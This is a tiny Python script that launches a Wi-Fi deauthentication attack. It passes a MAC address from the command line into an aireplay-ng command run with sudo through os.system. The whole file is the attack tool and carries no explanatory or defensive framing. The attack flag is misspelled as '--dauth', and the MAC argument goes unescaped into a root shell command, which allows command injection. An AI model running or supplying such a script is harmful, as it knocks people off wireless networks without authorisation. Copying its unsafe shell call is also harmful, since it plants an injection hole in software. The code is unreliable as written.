import os
import sys

mac = sys.argv[1]
os.system("sudo aireplay-ng --dauth 5 -a {} wlan1mon".format(mac))
